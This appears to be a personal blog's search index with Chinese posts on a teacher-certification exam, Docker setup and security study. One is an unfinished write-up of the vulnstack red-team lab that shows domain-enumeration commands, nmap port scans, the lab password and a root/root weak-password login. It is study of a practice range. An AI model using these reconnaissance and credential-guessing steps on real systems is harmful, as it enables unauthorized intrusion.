<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>教师资格证考试总结</title>
      <link href="2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是教师资格证考试"><a href="#什么是教师资格证考试" class="headerlink" title="什么是教师资格证考试"></a>什么是教师资格证考试</h2><p><a href="https://baike.baidu.com/item/教师资格证/3287811">教师资格证</a>考试，是由<a href="https://baike.baidu.com/item/教育部考试中心/5104094">教育部考试中心</a>官方设定的<a href="https://baike.baidu.com/item/教师资格考试/4063442">教师资格考试</a>。</p><p>2012年之前，教师资格考试是由各省自行组织命题和考试。主要针对<a href="https://baike.baidu.com/item/非师范专业/15529578">非师范专业</a>需要考取教师资格证的考生。（<strong>师范专业学校直接颁发教师资格证</strong>）</p><p>2012年后，教师资格考试纳入统考试点和省考相结合的模式。到2018年除了新疆，内蒙古，西藏三个地区外<strong>其他省份全部纳入了教师资格统考</strong>，由教育部考试中心出题，地方教育考试院主考。主要<strong>针对师范专业和非师范专业需要考取教师资格证的考生</strong>。</p><h2 id="报考条件"><a href="#报考条件" class="headerlink" title="报考条件"></a>报考条件</h2><p>符合以下基本条件的人员，可以报名参加教师资格考试：</p><p>1．具有中华人民共和国国籍；</p><p>2．遵守宪法和法律，热爱教育事业，具有良好的思想品德；</p><p>3．符合申请认定教师资格的体检标准；</p><p>4．符合《教师法》规定的学历要求。</p><p>（一）幼儿园教师资格，应当具备幼儿师范学校毕业及以上学历。</p><p>（二）小学教师资格，应当具备<a href="https://baike.baidu.com/item/中等师范学校/4909468">中等师范学校</a>毕业及以上学历。</p><p>（三）初中教师资格，应当具备高等<a href="https://baike.baidu.com/item/师范专科学校/7881407">师范专科学校</a>或者其他大学专科毕业及以上学历。</p><p>（四）高级中学和<a href="https://baike.baidu.com/item/中等职业学校/7487709">中等职业学校</a>教师资格，应当具备高等师范院校本科或者大学本科毕业及以上学历。</p><p>（五）中等职业学校实习指导教师资格，应当具备中等职业学校毕业及以上学历，并应当具有相当助理工程师以上<a href="https://baike.baidu.com/item/专业技术职务/6597015">专业技术职务</a>或中级以上工人技术等级。</p><p><strong>考生应在户籍(开封)、学籍(在哪上的大学就在哪考试)或人事关系(在哪工作就在哪考试)所在市州报名</strong>参加中小学教师资格考试。<strong>普通高等学校毕业及其毕业前一年级学生(就是说大三大四的可以参加报考)</strong>，以及在校<a href="https://baike.baidu.com/item/全日制研究生/10588952">全日制研究生</a>，可凭学校学籍管理部门出具的在籍学习证明报考，在就读学校所在地报名参加中小学教师资格考试。</p><p>被撤销教师资格的，5年内不得报名参加考试；受到剥夺政治权利，或故意犯罪受到有期徒刑以上刑事处罚的，不得报名参加考试。曾参加教师资格考试有作弊行为的，按照《<a href="https://baike.baidu.com/item/国家教育考试违规处理办法/6994647">国家教育考试违规处理办法</a>》(教育部令第33号，下同)的相关规定执行。</p><h2 id="统考地区"><a href="#统考地区" class="headerlink" title="统考地区"></a>统考地区</h2><p>北京、天津、河北、山西、辽宁、吉林、黑龙江、上海、江苏、浙江、安徽、福建、江西、山东、<strong>河南</strong>、湖南、湖北、广东、广西、海南、重庆、四川、贵州、云南、陕西、甘肃、宁夏、青海</p><p>本篇文章为针对统考地区的考试前的总结。</p><p>统考地区目前的考试内容如下：</p><blockquote><p>幼儿园：综合素质+保教知识与能力</p><p>小学：综合素质+教育教学知识与能力</p><p><strong>中学：综合素质+教育知识与能力+学科知识与能力</strong></p></blockquote><h2 id="关于考核的身体条件"><a href="#关于考核的身体条件" class="headerlink" title="关于考核的身体条件"></a>关于考核的身体条件</h2><p>“身体条件”应为教育教学能力的一部分，或者说是承担教育教学任务的“硬件”，因为教师(特别是小学和幼儿园教师)身体条件对教育教学效果有一定影响。《教师资格条例》第六条规定：“有教育教学能力应当包括符合国家规定的从事教育教学工作的身体条件。”教师身体条件主要是<strong>要求无传染性疾病，无精神病史，有完全的法律行为能力</strong>等。“身体条件”的具体标准参照师范教育类专业招生体检标准的有关规定执行。</p><h2 id="考试流程"><a href="#考试流程" class="headerlink" title="考试流程"></a>考试流程</h2><ol><li>考普通话证（语文老师要二级甲等以上(<strong>87分－91.99分之间</strong>)；其他科目要二级乙等以上(<strong>80分－86.99分之间</strong>） 一般3月到6月，9月到12月每个月可以考一次。</li><li>考心理学以及教育学（该考试半年一次，通常在3月和10月，  有效期要根据自己省份的规定，因此最好一次性通关；在考心理学和教育学时，就要报名好考试的等级——幼儿教师/小学/初中/高中&amp;高职/大学，你的学历一定要高你报名等级一级，如果你要教高中就一定要大专以上学历，另外大学教师证是提供给大学在职教师考的）(<strong>值得一提的是现在统考(国考)已经将这两门学科融入到了‘一次考试’的内容里面了，所以不用特殊报名，直接考笔试就OK了</strong>)</li><li>拿上你的以上三个证外加毕业证、身份证、体检，就可以去报名试讲——也就是“说课”，这个时候你要选好科目（就是要选好数学、语文之类的） 。说课一般是15分钟，考之前上网下一下模板。 在每年6月和11月，通过说课就可以拿证了。</li></ol><h2 id="考试时间安排"><a href="#考试时间安排" class="headerlink" title="考试时间安排"></a>考试时间安排</h2><p><strong>时间安排大致如下</strong></p><div class="table-container"><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>1月14日</td><td>2021上半年笔试报名</td></tr><tr><td>3月3日</td><td>2020下半年面试成绩查询</td></tr><tr><td>3月13日</td><td>2021上半年笔试考试</td></tr><tr><td>4月15日</td><td>2021上半年笔试查询2021上半年面试报名</td></tr><tr><td>5月15-16日</td><td>2021上半年面试考试</td></tr><tr><td>6月12日</td><td>2021上半年面试成绩查询</td></tr><tr><td><strong>时间</strong></td><td><strong>事件</strong></td></tr><tr><td>9月3日</td><td>2021下半年笔试报名</td></tr><tr><td>10月30日</td><td>2021下半年笔试考试</td></tr><tr><td>12月10日</td><td>2021下半年笔试成绩查询2021下半年面试报名</td></tr><tr><td>2022年1月8-9日</td><td>2021下半年面试考试</td></tr><tr><td>1月14日</td><td>2022上半年笔试报名</td></tr><tr><td>3月3日</td><td>2021下半年面试成绩查询</td></tr></tbody></table></div><h3 id="细分时间安排"><a href="#细分时间安排" class="headerlink" title="细分时间安排"></a>细分时间安排</h3><p>笔试 <strong>各科目考试时间为120分钟</strong>。</p><p>面试 <strong>考试时间为20分钟</strong>。</p><h1 id="考试内容总结"><a href="#考试内容总结" class="headerlink" title="考试内容总结"></a>考试内容总结</h1><p><strong>1、教师资格证考试有哪些学段和学科</strong></p><p>教师资格证考试包括<strong>幼儿园、小学、中学，</strong>其中<strong>中学又分为初中、高中及中职，</strong>下边我来挨个说说各学段包含的学科：</p><p>这里只总结高中的相关的学科</p><p><strong>高中：</strong>包括17个学科，分别为语文、数学、英语、物理、化学、生物、思想品德、历史、地理、体育与健康、音乐、美术、信息技术、通用技术、心理健康教育、日语、俄语；</p><p><strong>注意：</strong>我们教师资格证的考试对于考生的专业是不作要求的，比如你是学音乐的，但你照样可以选择报考体育学科。<strong>但是，在这里建议各位考生，尽量还是选一个和你专业相近的科目去报考，因为许多地区在进行教师招聘时，都会要求考生的报考科目与所学专业一致或相近</strong>。</p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-5289f18b3406de812ec7c102c62a946b_r.jpg" alt="教师资格证笔试科目"></p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-44827c601dad868e49eb37e5b33fb34e_720w.jpg" alt="中学除科目三的考试内容"></p><p>关于考试的试题，这里就没什么好总结的了，因为考试的话根据我的经验，<strong>最好的了解与提升方式就是看往年的真题</strong>，明天想办法拿到真题再说吧。</p><p><a href="教师资格证考试总结/2020下半年教师资格考试中学《综合素质》试题_天津中公教育.pdf">《综合素质》真题pdf版，点击下载</a>。想要答案的请加我qq，[ :萌: ] 2994016494。</p><p><a href="https://wenku.baidu.com/view/60fc3ddf4b7302768e9951e79b89680203d86b8c.html">《教育知识与能力》真题链接</a></p><p>个人感觉大部分选择题都是些常识性的题目，这两门是同意都要考得，涵盖的是教育学与心理学相关的知识，需要资料较为统一。</p><p>然后就是<strong>《学科知识与教学能力》了</strong>，如果前面的两门相当于高考时的<strong>语数外</strong>的话，这一门分的就是文综与理综了，考的知识点专精，例如<strong>英语学科与教学能力</strong>的往年的试题如下</p><p><a href="https://www.233.com/teacher/zxzzt/201806/28090801272.html">英语学科往年试题</a></p><p>之后就是个把月之后还有的面试了，面试相关的知识较为简单，那个等对教师资格证的考试体制有了更深一步的了解之后会再去总结，面试的话主要就是备课、上课、面试几大步吧应该。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教师资格证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运维经验贴</title>
      <link href="2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos运维经验"><a href="#Centos运维经验" class="headerlink" title="Centos运维经验"></a>Centos运维经验</h1><h2 id="docker相关的经验"><a href="#docker相关的经验" class="headerlink" title="docker相关的经验"></a>docker相关的经验</h2><h3 id="直接对docker的操作"><a href="#直接对docker的操作" class="headerlink" title="直接对docker的操作"></a>直接对docker的操作</h3><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2yum-config-manager --add-repo https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repodnf install https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;7&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.13-3.1.el7.x86_64.rpmdnf install docker-cesudo yum install docker-ce docker-ce-clisudo systemctl start dockerdocker --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl enable docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><blockquote><ul><li><p>docker中国官方</p> <pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;registry.docker-cn.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>网易</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;hub-mirror.c.163.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>USTC</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>阿里云　　</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;你的ID&gt;.mirror.aliyuncs.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">换源的方法是编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json（如果不存在则创建）:&#123;    &quot;registry-mirrors&quot;:[         &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,         &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,         &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;    ] ,    &quot;insecure-registries&quot;:[       &quot;docker.mirrors.ustc.edu.cn&quot;,         &quot;registry.docker-cn.com&quot;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="重启docker"><a href="#重启docker" class="headerlink" title="重启docker"></a>重启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">systemctl start docker   # 一般开启docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="对docker容器的操作"><a href="#对docker容器的操作" class="headerlink" title="对docker容器的操作"></a>对docker容器的操作</h3><h3 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h3><pre class="line-numbers language-none"><code class="language-none">sudo docker run --name ctfd -d -p 80:8000 ctfd&#x2F;ctfd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学总刊</title>
      <link href="2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h1><h2 id="通过QQ电话实现低精度ip定位"><a href="#通过QQ电话实现低精度ip定位" class="headerlink" title="通过QQ电话实现低精度ip定位"></a>通过QQ电话实现低精度ip定位</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无线安全</title>
      <link href="2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
      <url>2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝牙攻击"><a href="#蓝牙攻击" class="headerlink" title="蓝牙攻击"></a>蓝牙攻击</h1><h2 id="蓝牙是什么"><a href="#蓝牙是什么" class="headerlink" title="蓝牙是什么?"></a>蓝牙是什么?</h2><blockquote><p>在当前的网络应用中，物联网具有对物品多样性、低成本、低速率、短距离等特征的泛在需求，这类需求主要通过蓝牙等低速网络协议实现。蓝牙是一种短距离通信开放标准，利用嵌入式芯片实现通讯距离在10m～100m之间的无线连接。蓝牙的设计目标在于通过统一的近距离无线连接标准使各生产商生产的个人设备都能通过该网络协议更方便地实现低速率数据传输和交叉操作。蓝牙技术具有低成本、低功耗、模块体积小、易于集成等特点，非常适合在新型物联网移动设备中应用。</p></blockquote><h2 id="几种攻击方式"><a href="#几种攻击方式" class="headerlink" title="几种攻击方式"></a>几种攻击方式</h2><p>引用自此、<a href="https://www.chomptech.com/3843.html">https://www.chomptech.com/3843.html</a></p><blockquote><p><strong>针对蓝牙的攻击威胁大体上可以分为两种，一种是对不同无线网络均适用的攻击，—种是针对蓝牙特定的攻击。</strong></p><p>3.1拒绝服务攻击：拒绝服务攻击(DOS)的原理是在短时间内连续向被攻击目标发送连接请求，使被攻击目标无法与其他设备正常建立连接。蓝牙的逻辑链路控制和适配协议规定了蓝牙设备的更高层协议可以接收和发送64KB的数据包，类似于ping数据包，针对这个特点，攻击者可以发送大量ping数据包占用蓝牙接口，使蓝牙接口不能正常使用，并目一直使蓝牙处于高频工作状态从而耗尽设备电池。DoS攻击流程图如图4所示。</p><p>3.2中间人攻击：在两个设备之间的攻击者截获数据一方发送的数据后再转发给另一方，可在不影响双方通信的情况下获得双方通信的内容，是一种广泛应用于无线网络的攻击方式。蓝牙4.0版本的低功耗蓝牙技术(BluetoothLowEnergy，BLE)在设计初始时有防范中间人攻击的安全措施，但是在产品阶段考虑到产品功耗成本等因素，这方面并没有得到足够的重视，依然容易受到攻击。最常见的是用软硬件结合的蓝牙攻击设备伪造BLE通信进行中间人攻击。中间人攻击示意图如图5所示。</p><p>3.3漏洞窃听：蓝牙窃听可以通过对蓝牙漏洞的攻击来实现，蓝牙中的OBEX(ObjectExchange)协议，即对象交换协议在早期的蓝牙产品规范中没有强制要求使用权鉴，所以攻击者可以利用此漏洞在被攻击者手机没有提示的情况下链接到被攻击手机，获取对手机内各种多媒体文件以及短信通话记录等文件的增删改权限，甚至可以通过手机命令拨打接听电话。具有这些攻击功能的指令代码被黑客写成了手机软件，可在网络上下载。普通人_般会使用图形化界面去操作，某些山寨手机中甚至自带这项功能，当和别的手机配对成功后即可获得对方手机的操作权限。不过随着蓝牙技术的不断提升，针对早期蓝牙漏洞的攻击现在已经越来越少见。</p><p>3.4重放攻击：重放攻击的原理是监听或者伪造双方通信的认证凭证，经过处理后再回发给被攻击方进行认证。蓝牙传输过程中有79个信道，攻击者可以通过监听信道、计算跳频时序、回放已授权设备的IZI令来进行攻击。V4.2的标准中已经增加了防止重放攻击的协议。</p><p>3.5配对窃听：蓝牙V2.0及之前更早版本默认的4位PIN码很容易被暴力破解，因为低位数字排列组合的方式十分有限，蓝牙V4.0的LE配对同理。攻击者只要监听到足够的数据帧，就可以通过暴力破解等方式确定密钥，模拟通信方，实现攻击目的。</p><p>3.6位置攻击：每个蓝牙设备都有唯一的6字节序列号作为设备地址，这种序列标识由于在使用过程中不发生改变很容易泄露设备的位置信息。攻击者可以根据蓝牙的调频连接机制和寻呼机制、设备标识符和其他通信参数获得被攻击者设备的地理位置。</p><p>3.7简单配对模式攻击：蓝牙V2.0规定的SSP安全简单配对连接方式并不安全，是由于使用了静态口令而无法防止中间人攻击，并且一旦攻击者取得了口令，在一段时间内可以用此口令进行持续性攻击。</p></blockquote><p>暂时因为linux虚拟机的问题解决不了而放弃。。。</p><h1 id="WIFI攻击"><a href="#WIFI攻击" class="headerlink" title="WIFI攻击"></a>WIFI攻击</h1><h2 id="什么是WIFI"><a href="#什么是WIFI" class="headerlink" title="什么是WIFI"></a>什么是WIFI</h2><blockquote><p>无线网络上网可以简单的理解为无线上网，几乎所有<a href="https://baike.baidu.com/item/智能手机">智能手机</a>、<a href="https://baike.baidu.com/item/平板电脑">平板电脑</a>和笔记本电脑都支持Wi-Fi上网，是当今使用最广的一种无线网络传输技术。实际上就是把有线网络信号转换成无线信号，就如在开头为大家介绍的一样，使用无线路由器供支持其技术的相关电脑，<a href="https://baike.baidu.com/item/手机/6342">手机</a>，平板等接收。手机如果有Wi-Fi功能的话，在有Wi-Fi无线信号的时候就可以不通过移动联通的网络上网，省掉了流量费。</p><p>无线网络无线上网在大城市比较常用，虽然由Wi-Fi技术传输的无线通信质量不是很好，数据安全性能比蓝牙差一些，传输质量也有待改进，但传输速度非常快，可以达到54Mbps，符合个人和社会信息化的需求。Wi-Fi最主要的优势在于不需要布线，可以不受布线条件的限制，因此非常适合移动办公用户的需要，并且由于发射信号功率低于100mw，低于手机发射功率，所以Wi-Fi上网相对也是最安全健康的。</p><p>但是Wi-Fi信号也是由有线网提供的，比如家里的<a href="https://baike.baidu.com/item/ADSL">ADSL</a>，小区宽带等，只要接一个<a href="https://baike.baidu.com/item/无线路由器">无线路由器</a>，就可以把有线信号转换成Wi-Fi信号。国外很多发达国家城市里到处覆盖着由政府或大公司提供的Wi-Fi信号供居民使用，我国也有许多地方实施”<a href="https://baike.baidu.com/item/无线城市">无线城市</a>“工程使这项技术得到推广。在4G牌照没有发放的试点城市，许多地方使用4G转Wi-Fi让市民试用。(现在已经5G了，也就是说百度百科的某些信息都已经过时了)</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB靶场复现总刊</title>
      <link href="2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="域渗透的基础知识"><a href="#域渗透的基础知识" class="headerlink" title="域渗透的基础知识"></a>域渗透的基础知识</h2><p><a href="https://www.freebuf.com/company-information/172630.html">干货！内网渗透测试之域渗透详解！收藏！</a></p><p><a href="http://www.91ri.org/10154.html">内网渗透之-域渗透基础</a></p><p>希望今天可以简单学习一下域渗透的基础知识，为明天的域渗透实战做好准备    ——2021年6月4日</p><h3 id="域渗透场景"><a href="#域渗透场景" class="headerlink" title="域渗透场景"></a>域渗透场景</h3><p>场景一：某处于域中的服务器通过路由做端口映射，对外提供web服务，我们通过web脚本漏洞获得了该主机的system权限，如果甲方有进一步的内网渗透测试需求，以证明企业所面临的巨大风险，这个时候就需要做内网的域渗透。</p><p>……</p><p>域渗透看起来就像是所获成果的效益最大化，拿到system权限之后，再用该拿到权限的主机作为跳板打通内网</p><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p><p><strong>&lt;域控制器、域成员、web服务器&gt;</strong></p><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p><h3 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红日安全靶场"><a href="#红日安全靶场" class="headerlink" title="红日安全靶场"></a>红日安全靶场<01 att&ck红队评估></01></h2><h3 id="零、靶场介绍与下载"><a href="#零、靶场介绍与下载" class="headerlink" title="零、靶场介绍与下载"></a>零、靶场介绍与下载</h3><h4 id="0-靶场下载地址"><a href="#0-靶场下载地址" class="headerlink" title="0.靶场下载地址"></a>0.靶场下载地址</h4><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场下载地址</a></p><p><strong>靶场介绍</strong></p><pre class="line-numbers language-none"><code class="language-none">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：一、环境搭建1.环境搭建测试2.信息收集二、漏洞利用3.漏洞搜索与利用4.后台Getshell上传技巧5.系统信息收集6.主机密码收集三、内网搜集7.内网--继续信息收集8.内网攻击姿势--信息泄露9.内网攻击姿势-MS08-067 10.内网攻击姿势-SMB远程桌面口令猜测11.内网攻击姿势-Oracle数据库TNS服务漏洞12.内网攻击姿势-RPC DCOM服务漏洞四、横向移动13.内网其它主机端口-文件读取14.内网其它主机端口-redis15.内网其它主机端口-redis Getshell16.内网其它主机端口-MySQL数据库17.内网其它主机端口-MySQL提权五、构建通道18.内网其它主机端口-代理转发六、持久控制19.域渗透-域成员信息收集20.域渗透-基础服务弱口令探测及深度利用之powershell21.域渗透-横向移动[wmi利用]22.域渗透-C2命令执行23.域渗透-利用DomainFronting实现对beacon的深度隐藏24.域渗透-域控实现与利用七、痕迹清理25、日志清理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="1-环境搭建测试"><a href="#1-环境搭建测试" class="headerlink" title="1.环境搭建测试"></a>1.环境搭建测试</h4><p>先配置靶场环境，</p><p><code>统一密码：hongrisec@2019</code>，但是有两个主机的密码是需要修改的，这里我选择修改两个server主机为了<code>@dmin123</code>。</p><p>进入问7之后发现这个负责连接外网展示web界面的主机’坏掉了’，这里需要简单地配置一下。</p><p><a href="https://troyess.com/2021/06/03/vulnstack%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98-%E4%B8%80/">vulnstack内网靶场(一)保姆级教程</a></p><p>wrwrwr我太困了，眼疼，先上床追会儿剧。</p><p>主要就是打开三个虚拟机，</p><ol><li><p>先用<code>hongrisec@2019</code>这个密码进域控虚拟机机，然后进域成员虚拟机，注意这里都是需要改密码的。</p></li><li><p>然后打开win7的虚拟机进去直接就能用<code>hongrisec@2019</code>登录，但是提示要重新启动，这时候直接选择立即重新启动。</p></li><li>重启之后配置网卡。我这里两个图，直接按我下面的这样应该就是可以的(大概)</li><li>再web服务器win7上的c盘，找到PHP study并将其打开。</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002015556.png" alt="虚拟网络编辑器"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002326199.png" alt="分别配置各个虚拟机的网络"></p><p>上面域控虚拟机名字写错了，应该是server 2008的，手抖手抖。</p><p><strong>大概情况就是下面的情况：</strong></p><div class="table-container"><table><thead><tr><th>模拟内、外网的网卡名与名下ip地址</th><th>连接该网卡的虚拟机</th></tr></thead><tbody><tr><td>VMnet1/192.168.52.0</td><td>环境里面的三个虚拟机server2008、server 2003、Windows 7都要先连接内网的网络适配器VMnet1</td></tr><tr><td>VMnet2/192.168.72.0</td><td>负责web服务的机器Windows 7和攻击机kali都要链接这个模拟外网的网络适配器VMnet2</td></tr></tbody></table></div><h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>模拟黑盒先试试，就是不进去win7看有没有什么服务，而是直接进入攻击机 kali里面通过扫描这种资产收集方式进行信息收集</p><p><strong>1.端口扫描</strong></p><p>因为这里已经知道只有一个外部ip(win7的ip了)，所以这里也直接可以免去对目标C段的扫描了，直接掏出诸神之眼nmap扫描。</p><p><a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">nmap常见命令的使用</a></p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -p 1-65535  # 对目标主机进行全端口快速扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605004340032.png" alt></p><p>这里我们扫描简单得多了，因为”网络很好”，直接可以开T4，这里也是<strong>大概两分多钟</strong>就扫描完毕了，但是实战时有时T4是不行的似乎。</p><p>想看扫描过程的话加个参数<code>-v</code>即可</p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -v -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div class="table-container"><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>php探针</td></tr><tr><td>3306</td><td>mysql数据库</td></tr></tbody></table></div><p>然后可以使用dirsearch对80端口进行一个简单的目录扫描</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010554845.png" alt="image-20210605010554845"></p><p>80扫描到了phpMyAdmin的服务，这里应该直接在这里连接数据库3306的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010800401.png" alt="PHP版本"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010832281.png" alt="phpMyAdmin"></p><p>外网能进行的信息收集也就这么多了。</p><h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><h4 id="3-漏洞搜索与利用"><a href="#3-漏洞搜索与利用" class="headerlink" title="3.漏洞搜索与利用"></a>3.漏洞搜索与利用</h4><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005358760.png" alt="80端口的php study探针"></p><p>注意到最下方有个MySQL数据库的连接检测，简单测试了一下，是可以用弱口令进行爆破的，但是这个口令实在是太弱了，也没必要再上BurpSuite了。<code>用户名/root        密码/root</code></p><p><img 